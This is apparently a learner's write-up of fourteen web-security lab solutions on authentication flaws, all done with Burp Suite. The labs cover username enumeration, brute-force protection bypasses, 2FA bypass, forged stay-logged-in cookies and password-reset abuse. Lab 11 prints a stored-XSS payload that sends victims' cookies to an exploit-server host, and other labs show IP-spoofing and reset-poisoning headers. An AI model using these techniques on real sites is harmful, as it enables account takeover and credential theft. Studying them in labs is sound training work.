## Labs Covered

1. Username enumeration via different responses  
2. Username enumeration via subtly different responses  
3. Username enumeration via response timing  
4. Broken brute-force protection (IP block)  
5. Username enumeration via account lock  
6. Multiple credentials per request  
7. 2FA simple bypass  
8. Broken 2FA logic  
9. 2FA brute force with macros  
10. Brute-forcing stay logged-in cookie  
11. Offline password cracking  
12. Password reset broken logic  
13. Password reset poisoning  
14. Password brute-force via password change




## 1. Username enumeration via different responses
   Login with random credentials and capture the request in Burp. First brute-force the username to find a valid one, then use that username to brute-force the password.

<br>

## 2. Lab: Username enumeration via subtly different responses
Login using random credentials and capture the request in Burp. Send the request to Intruder and first brute-force the usernames. Use Settings → Grep - Extract and add `Invalid username or password` to help spot response differences. Start the attack and look for the response that is slightly different (for example, `Invalid username or password` without the `.`). This indicates the valid username. Then use that username to brute-force the password.

<br>

## 3. Username enumeration via response timing
   Capture the login request in Burp and compare the response time for a non-existing user and a known user (the lab provides valid credentials). Increase the password length gradually and observe the response time difference.

The application also blocks many requests from the same IP, so this can be bypassed by adding the header:

```
X-Forwarded-For: 127.0.0.$1$
```

This changes the IP for each request.

Send the request to Intruder and set the attack type to Pitchfork. Use payloads for both the IP and the username. Start the attack and look for the response with a noticeably longer response time. That username is valid. Then use it to brute-force the password.


   <br>

## 4. Broken brute-force protection, IP block

The main idea for this lab was: *If failed login counters reset after a successful login, an attacker can periodically log in to their own account between attempts to reset the limit and continue brute-forcing another account without being blocked.*
This lab has a mechanism like this: After trying to log in using wrong credentials **3 times**, it blocks the attacker for **1 minute**. But if we log in using the wrong credential **2 times** and then log in using the **correct credential**, the failed login attempt counter gets **reset**.
So to solve this lab I approached it like this:
For the payload lists I used **Burp Suite Intruder with the Pitchfork attack type**.
One payload list contained the **usernames** and the other contained the **passwords**.
For the payload pattern I structured the requests like this:

```
wiener -> peter
carlos -> randompass1
carlos -> randompass2
wiener -> peter
carlos -> randompass3
carlos -> randompass4
wiener -> peter
.....
.....
```

Here **`wiener : peter`** is a valid login, which resets the failed login counter.
Between these valid logins, I attempted two password guesses for the target user **`carlos`**.
This way the application never reached the **3 failed attempt limit**, so the IP was never blocked.
By continuing this pattern with a password wordlist, I was eventually able to find the correct password for **`carlos`** and log in successfully.

<br>

## 5. Username enumeration via account lock
The main concept for this challenge was *Account locking stops many password attempts on one account (if the username exists), but attackers try a few common passwords on many accounts to avoid the lock.*
So to solve this challenge, first I tried to log in using random credentials and captured that request in Burp. Then I sent that request to **Burp Intruder** and set the payload type to **Cluster Bomb**.
For the username payloads, I used all the usernames the challenge gave, and for the password payloads I used around 10 random passwords, then started the attack.
I noticed that for one username the response was different and showed the error:
`You have made too many incorrect login attempts. Please try again in 1 minute(s).`
This indicated that the username exists.
So I took this username, changed the attack type to **Sniper**, used all the given passwords as the payload list, and started the attack. For the correct credential, the response returned **without the error**, which indicated a successful login.


## 6. Broken brute-force protection, multiple credentials per request
User rate limiting blocks too many login requests from the same IP, but attackers can bypass it by changing IP addresses or guessing multiple passwords in a single request.

	After capturing the login request, it had something like this:
	```
	{"username":"carlos","password":"ff"}
	```
	Instead of sending a single password value, I modified the request so that the password parameter contains an array of passwords. It looked something like this:
	```
	{"username":"carlos","password":["123456","password","qwerty", ... ]}
	```
	By doing this, the server processes multiple passwords in one HTTP request. Since the rate limit counts the number of requests and not the number of passwords checked, this allows many password guesses to be made while sending only a single request.
	After sending the modified request, one of the passwords in the array matched the correct password, which resulted in a successful login.

<br>

## 7. 2FA simple bypass
   First I logged in to my own account. After logging in, the 2FA verification code was sent to my email, which I accessed using the Email client button.
   After that, I logged out of my account and logged in again using the victim's credentials. And I Intercepted that request. After Intercepting I sent the first request and dropped that redirected request.
   Then at the url bar I added `/my-account`. Since the application did not properly enforce the 2FA check, the account page loaded successfully, which solved the lab.

## 8. 2FA broken logic
**If the website trusts a user-controlled value (like a cookie) to identify the account during the 2FA step, an attacker can change that value to another username and attempt to complete 2FA for the victim’s account.**

First I logged in to my own account with Burp running and looked at the 2FA verification requests. I noticed that the `verify` parameter in the `/login2` request decides which user's account is being verified.
Then I logged out and captured the `GET /login2` request. I sent it to Burp Repeater and changed the `verify` value to `carlos` to generate a 2FA code for Carlos.
Next, I logged in again with my own credentials and entered a wrong 2FA code. I captured the `POST /login2` request and sent it to Burp Intruder.
In Intruder, I set `verify=carlos` and brute-forced the `mfa-code`. One response returned `302`, which meant the code was correct.
I opened that response in the browser and clicked My account, which solved the lab.


## 9. 2FA bypass using a brute-force attack
2FA codes are usually short (like 4 digits), so they can be brute-forced easily. Some websites try to stop this by logging the user out after a few wrong attempts. However, an attacker can automate the login process using Burp macros and keep brute-forcing the 2FA code.

First I logged in as carlos with Burp running and looked at the 2FA process. I noticed that after entering the wrong code two times, the application logs the user out. This means we need to log back in before each brute-force attempt.
To handle this, I created a session handling rule in Burp. I went to Settings → Sessions → Session Handling Rules and added a new rule. In the scope, I selected include all URLs.
Then I added a rule action to run a macro. In the Macro Recorder I selected these requests:
```
GET /login
POST /login
GET /login2
```
This macro logs in as carlos and brings us back to the 2FA page. Then I saved the rule.
Now Burp will automatically log in again before each request.
Next I captured the POST /login2 request and sent it to Burp Intruder. I added a payload position to the mfa-code parameter.
For payloads I selected Numbers and set the range from 0 to 9999 with 4 digits. This generates all possible 4-digit codes.
Then I created a resource pool and set Maximum concurrent requests to 1 to avoid breaking the session.
After starting the attack, eventually one request returned status code 302, which means the correct code was found. I opened that response in the browser and clicked My account, which solved the lab.

## 10. Brute-forcing a stay-logged-in cookie
(If a stay-logged-in cookie is generated using predictable values (like username and a hashed password), an attacker can recreate the cookie and brute-force passwords to log in as other users.)
First I logged in to my account with Burp running and selected the Stay logged in option. This created a stay-logged-in cookie.
I inspected the cookie and saw it was Base64 encoded. After decoding it, the value looked like `wiener:51dc30ddc473d43a6011e9ebba6ca770`. The second part looked like an MD5 hash. After hashing my password with MD5, it matched. 
Then I logged out.
Next I captured the `GET /my-account` request and sent it to Burp Intruder. I removed `?id=wiener` from the URL and made sure the session cookie was empty (`session=`). The stay-logged-in cookie was used as the payload position. I used the given password list as my payloads.
For payload processing I added these rules:

* Hash → MD5
* Add prefix → `carlos:`
* Encode → Base64

After starting the attack, most responses returned `302`. Only one request returned `200` and the response contained `Update email`. That payload was the valid stay-logged-in cookie for Carlos, which solved the lab.

## 11. Offline password cracking
If a stay-logged-in cookie contains predictable data like username and a hash of the password, an attacker can steal the cookie using XSS and recover the password.

First I logged in to my account with Burp running and checked the Stay logged in feature. I saw the stay-logged-in cookie was Base64 encoded.
From the login response I noticed the cookie is built like this:

```
username:md5(password)
```

Then I saw the blog comment section was vulnerable to stored XSS. I opened the exploit server and copied its URL.
Next I posted this payload in a blog comment:
```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

When the victim viewed the comment, their cookie was sent to my exploit server.
I checked the access log and found the victim’s cookie. After decoding it in Burp Decoder I got:

```
carlos:26323c16d5f4dabff3bb136f2460a943
```

I searched the hash online and found the password was `onceuponatime`. Then I logged in as carlos and deleted the account to solve the lab.

## 12. Password reset broken logic
Concept:
If the server does not properly verify the password reset token, an attacker can change the username in the request and reset another user’s password.

First I clicked Forgot your password. Then I opened the Email client and used the reset link to change my password.
When I clicked the reset password link, it took me to a page where I had to enter a new password and confirm it. I submitted that form and captured the request in Burp.

```
POST /forgot-password?temp-forgot-password-token=1mpzzlxz82gasfek7hse35s8htczckrz HTTP/2
```

In the request body I saw this:

```
temp-forgot-password-token=1mpzzlxz82gasfek7hse35s8htczckrz&username=wiener&new-password-1=montoya&new-password-2=montoya
```

I changed the username from `wiener` to `carlos` and sent the request.
Carlos’s password was changed to `montoya`. Then I logged in as carlos using that password.

## 13. Password reset poisoning via middleware
Password reset poisoning happens when a website uses headers like `X-Forwarded-Host` to generate the reset link. An attacker can change this header so the reset token is sent to their own server.

First I tested the password reset feature with Burp running. I saw that the reset email contains a link with a unique reset token.
Then I captured the `POST /forgot-password` request and sent it to Burp Repeater. I noticed the application accepts the `X-Forwarded-Host` header, which means I can control where the reset link points.
Next I opened the exploit server and copied its URL.
I went back to the request in Repeater and added this header:

```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Then I changed the username to `carlos` and sent the request.
After that I checked the exploit server access log. I saw a request containing the victim’s reset token in the URL.
I copied that token.
Then I took my own password reset link from the email and replaced the `temp-forgot-password-token` value with the token I stole from Carlos.
I opened that link in the browser and set a new password for Carlos.
Finally I logged in as Carlos with the new password, which solved the lab.

## 14. Password brute-force via password change

First I used the given credentials to get familiar with the mechanism. I logged in and changed the password once, then logged out and logged in again using the new password to confirm it worked.
After that I logged out again and tried logging in with random passwords to see how the login protection works. After about 3–4 wrong attempts the account was blocked for 1 minute. So normal password brute force on the login page would not work.
Then I logged in again and tried the password change feature. This time I intentionally entered different values in the new password and confirm password fields. The server returned an error saying `New passwords do not match`.
This showed that the application first checks whether the current password is correct before validating the new password fields.
So I captured the password change request in Burp and sent it to Intruder. I kept the new password fields different so the password would not actually change, and added a payload position to the `current-password` parameter.
Then I used a password list to brute-force the current password. Most responses returned `Current password is incorrect`, but one response only showed `New passwords do not match`. This indicated the correct current password was found.
Using that password, I logged in to the account successfully and solved the lab.
